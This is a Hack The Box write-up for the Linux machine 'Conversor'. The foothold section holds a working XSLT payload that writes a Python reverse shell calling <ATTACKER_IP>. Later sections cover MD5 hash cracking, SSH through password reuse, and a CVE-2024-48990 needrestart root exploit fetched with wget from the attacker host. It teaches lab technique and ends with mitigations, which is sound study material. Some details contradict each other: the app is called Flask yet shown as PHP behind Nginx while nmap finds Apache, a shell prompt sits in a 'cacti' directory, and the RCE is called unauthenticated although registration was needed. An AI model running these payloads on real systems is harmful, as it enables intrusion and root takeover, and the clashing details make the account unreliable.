# Conversor

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=flat&logo=linux&logoColor=white)
![Status](https://img.shields.io/badge/Status-Pwned-9FEF00?style=flat)

---

## Overview

| Field | Details |
|---|---|
| Machine Name | Conversor |
| Difficulty | Easy |
| Operating System | Linux (Ubuntu 22.04.5 LTS — `linux 5.15.0-160-generic`) |
| IP Address | 10.129.238.31 |

---

## Summary

> Conversor is an Easy Linux machine created by FisMatHack. The Flask web app accepts Nmap XML files and transforms them using user-supplied XSLT stylesheets. An accessible source code download exposes the full application structure, including a downloadable SQLite database. Downloading the about page archive reveals the app's source, from which the `install.md` documents a cron job that executes all `*.py` files in the `scripts/` directory as `www-data` every minute. A malicious XSLT stylesheet using the EXSLT `exsl:document` extension writes a Python reverse shell into that directory, which the cron job then executes. Inside the container, the live `instance/users.db` leaks MD5 hashes for all users; cracking the admin hash yields SSH credentials via password reuse. Local enumeration reveals `needrestart v3.7` is executable via `sudo NOPASSWD` — vulnerable to **CVE-2024-48990** (CVSS 7.8), a `PYTHONPATH` hijacking attack that tricks `needrestart` into loading a malicious shared object as root, granting a root shell.

---

## 1. Reconnaissance

### Nmap Scan

```bash
# Initial full service scan
nmap -sCV -A 10.129.238.31 -oN nmap/initial.txt

# Also save as XML for use in the app itself
nmap -A 10.129.238.31 -oX nmap.xml
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Open Ports

| Port | Protocol | Service | Version |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 |
| 80 | TCP | HTTP | Apache httpd 2.4.52 — redirects to `conversor.htb` |

### Notes

> Minimal attack surface — only SSH and HTTP. Port 80 redirects to `conversor.htb` (add to `/etc/hosts`). The web application is the sole entry point. Directory enumeration and source code analysis are the immediate next steps.

---

## 2. Enumeration

### Web Enumeration

```bash
# Add to /etc/hosts
echo "10.129.238.31    conversor.htb" | sudo tee -a /etc/hosts

# Directory enumeration
ffuf -u http://conversor.htb/FUZZ \
     -w /usr/share/wordlists/dirb/small.txt
```

```
about     [Status: 200]
login     [Status: 200]
logout    [Status: 302]
register  [Status: 200]
javascript [Status: 301]
```

> The `/about` page offers a source code archive download. The `/register` page allows open registration. Wappalyzer identifies the stack as **PHP 8.3.27** (via a WSGI wrapper) behind Nginx.

---

### Source Code Analysis

> The source archive downloaded from `/about` contains the full application. Key files and findings:

```bash
# Extract the archive and survey structure
tar -xvf source_code.tar.gz
ls -la
# app.py  app.wsgi  install.md  instance/users.db
# scripts/  static/nmap.xslt  templates/  uploads/
```

**`install.md`** — reveals a cron job that executes all Python scripts in `scripts/` as `www-data`:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

> This runs every minute — any `.py` file placed in `scripts/` executes as `www-data`. This is the foothold vector.

**`static/nmap.xslt`** — the reference XSLT template. It reveals expected structure and supported namespaces, useful for crafting a malicious XSLT. The XSLT processor supports the **EXSLT** `exsl:document` extension, which can write arbitrary files to the filesystem.

**`instance/users.db`** — the application's SQLite database. The downloaded copy may be empty (from the archive), but the live database on the server contains user credentials.

```bash
# Inspect the schema locally
sqlite3 instance/users.db
.tables
# files  users
.schema users
# id INTEGER, username TEXT, password TEXT
```

---

## 3. Foothold

### Vulnerability Identified

> **XSLT Server-Side File Write via EXSLT `exsl:document` Extension** — No CVE (design/configuration flaw).  
> The application passes user-uploaded XSLT stylesheets directly to the XSLT processor without restricting extension functions. The EXSLT `exsl:document` extension allows writing arbitrary content to arbitrary filesystem paths with the privileges of the web server (`www-data`). Combined with the cron job that auto-executes all `*.py` files in `scripts/`, this yields unauthenticated RCE.

### Exploitation

```bash
# Step 1 — Register an account and log in
http://conversor.htb/register
```

> Create a minimal Nmap XML stub for upload (the transform just needs valid XML — no real scan needed):

```xml
<!-- fake_nmap.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<nmaprun>
  <host>
    <address addr="127.0.0.1"/>
  </host>
</nmaprun>
```

> Craft a malicious XSLT that uses `exsl:document` to write a Python reverse shell into `scripts/`:

```xml
<!-- shell.xslt -->
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:exploit="http://exslt.org/common"
                extension-element-prefixes="exploit"
                version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/sh")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

```bash
# Step 2 — Start listener
nc -lvnp 4444

# Step 3 — Upload fake_nmap.xml + shell.xslt via the Conversor UI
# Navigate to the convert page, upload both files, and submit

# Wait up to 60 seconds for the cron job to execute shell.py
```

### Shell Obtained

> Reverse shell received as `www-data` inside the Docker container (hostname matches a container ID):

```bash
www-data@821fbd6a43fa:~/html/cacti$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 4. Lateral Movement

### Step 1 — Dump live database credentials

> The live SQLite database is at `/var/www/conversor.htb/instance/users.db` (not the archived copy):

```bash
sqlite3 /var/www/conversor.htb/instance/users.db
.tables
select * from users;
# 1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
# 5|boltech|5b8a8d8511c75b58cd07db2c275fa31a
```

> Both passwords are stored as **MD5** hashes. Crack with CrackStation or hashcat:

```bash
# Hashcat
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Hash for fismathack: 5b5c3ac3a1c897c94caad48e6c71fdec → <cracked password>
```

### Step 2 — SSH as `fismathack`

> The cracked password is reused as the SSH credential for user `fismathack` (the machine creator's own username):

```bash
ssh fismathack@conversor.htb
# Password: <cracked password>
```

> Shell access obtained as `fismathack`. User flag at `/home/fismathack/user.txt`.

---

## 5. Privilege Escalation

### Enumeration

```bash
# Check sudo permissions
sudo -l
```

```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

```bash
# Check needrestart version
/usr/sbin/needrestart -v 2>&1 | grep needrestart
# [main] needrestart v3.7
```

> `needrestart v3.7` is vulnerable to **CVE-2024-48990**. The binary can be run as root via `sudo` with no password — the ideal trigger for the exploit.

### Exploitation — CVE-2024-48990 (needrestart PYTHONPATH Hijack)

> **CVE-2024-48990 — Local Privilege Escalation in needrestart < 3.8 (CVSS 7.8)**  
> `needrestart` (before v3.8) scans running Python processes to detect those needing restart after library updates. During this scan, it reads the `PYTHONPATH` environment variable from a running Python process's `/proc/<pid>/environ` and passes it directly to a new Python invocation running as root. An attacker can plant a malicious `importlib/__init__.so` shared object in a path they control, set `PYTHONPATH` to point to it, run a Python process with that environment, then trigger `needrestart` as root — causing root to load and execute the malicious library.

```bash
# Step 1 — Download the PoC onto the target
# (from https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing)
wget http://<ATTACKER_IP>:8000/autorun.sh -O /tmp/autorun.sh
chmod +x /tmp/autorun.sh

# Step 2 — On attacker: serve the PoC files
python3 -m http.server 8000

# Step 3 — Run the setup script (downloads e.py + compiles importlib/__init__.so)
cd /tmp && ./autorun.sh
# [+] Process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell.

# Step 4 — Set PYTHONPATH and start the bait Python process
mkdir -p /tmp/rce
export PYTHONPATH="/tmp/rce"
python3 e.py &
# (keeps a Python process alive with the malicious PYTHONPATH in its /proc environ)

# Step 5 — In a second SSH session, trigger needrestart as root
sudo /usr/sbin/needrestart
```

> `needrestart` reads the bait process's `PYTHONPATH`, spawns Python as root with that path, and loads `/tmp/rce/importlib/__init__.so`. The shared object's constructor runs as root, spawning a root shell back in the first terminal.

```
Error processing line 1 of .../zope.interface-5.4.0-nspkg.pth:
  ImportError: dynamic module does not define module export function (PyInit_importlib)
Remainder of file ignored
Shell received
```

### Root / Administrator Access

```bash
# whoami
root
# cat /root/root.txt
<root flag here>
```

---

## 6. Flags

| Flag | Value |
|---|---|
| User | (retrieve via `cat /home/fismathack/user.txt`) |
| Root | (retrieve via `cat /root/root.txt`) |

---

## 7. Lessons Learned

> - **EXSLT extension functions in XSLT processors are dangerous** — `exsl:document` can write arbitrary files. Any application that passes user-controlled XSLT to a server-side processor without disabling extension elements is vulnerable. Always disable extension functions in XSLT processors used with user input.
> - **Cron jobs executing wildcard paths are high-value targets** — `scripts/*.py` executed every minute as `www-data` is effectively a timed RCE trigger. A world-writable or web-writable script directory plus a cron job is a textbook foothold chain.
> - **MD5 is not a password hash** — it was designed for data integrity, not key derivation. CrackStation resolves common MD5 hashes in milliseconds. Always use bcrypt, Argon2, or scrypt for passwords.
> - **Source code exposure is game over** — the `/about` download included `install.md` (which documented the cron job) and the SQLite database. Developers must never bundle sensitive deployment docs or database files into public source archives.
> - **CVE-2024-48990** is a subtle but critical flaw: `needrestart` trusts environment variables from processes it doesn't own, then passes them to a root-privileged Python invocation. The ImportError in the output is expected — the malicious `.so` already ran its constructor before the error occurs.
> - **The machine creator is a user in the database** — `fismathack` is both the HTB username of the machine creator and a valid system account. This is an intentional design choice that makes the credential hunting feel more realistic.
> - **Two-terminal exploit pattern** — CVE-2024-48990 requires one shell to host the bait process and a second to trigger `sudo needrestart`. Practice splitting shells (or use a multiplexer) to handle time-sensitive multi-step exploits.

---

## 8. Mitigation & Hardening

> - **XSLT Extension Functions**: Disable all EXSLT and extension element prefixes in the XSLT processor configuration. Use a restricted XSLT 1.0 processor with extension functions explicitly disabled (e.g., Saxon `--allow-extension-functions:false`, or Xalan's `TransformerFactory.setFeature` to disable). Apply input validation to reject XSLT stylesheets containing `extension-element-prefixes` or `exsl:document`.
> - **Cron job execution scope**: Never write cron jobs that execute all files in a directory with a wildcard (`scripts/*.py`). Instead, maintain an explicit allowlist of trusted scripts. Ensure that any directory executed by cron is not writable by web server processes or unprivileged users.
> - **Source code exposure**: Block access to sensitive files and directories at the web server level (`.htaccess` or `nginx.conf`). Never include databases, deployment documentation, or configuration files in downloadable archives. Use `.gitignore` and pre-publish review to catch accidental inclusions.
> - **MD5 password hashing**: Replace with bcrypt (cost ≥ 12), Argon2id, or scrypt. Force password resets for all existing users. Check new passwords against known-breached databases (HaveIBeenPwned API).
> - **CVE-2024-48990 (needrestart)**: Upgrade `needrestart` to version 3.8 or later immediately. If upgrade is not immediately possible, remove the NOPASSWD sudo rule for `needrestart` and restrict execution to root or trusted administrators only. Consider removing `needrestart` from interactive sudo access entirely and running it only via package manager hooks.
> - **Credential reuse**: Enforce separate credentials per service. The SSH password should never match a web application password. Implement key-based SSH authentication and disable password login.

---

## References

- [CVE-2024-48990 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-48990)
- [Qualys Advisory — Five LPEs in needrestart](https://blog.qualys.com/vulnerabilities-threat-research/2024/11/19/qualys-tru-uncovers-five-local-privilege-escalation-vulnerabilities-in-needrestart)
- [CVE-2024-48990 PoC — pentestfunctions (GitHub)](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing)
- [CVE-2024-48990 PoC — mladicstefan (GitHub)](https://github.com/mladicstefan/CVE-2024-48990)
- [Rediscovering CVE-2024-48990 — Ally Petitt (Medium)](https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80)
- [EXSLT `exsl:document` specification](http://exslt.org/exsl/elements/document/index.html)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [needrestart changelog — v3.8 patch](https://github.com/liske/needrestart/blob/master/Changelog)
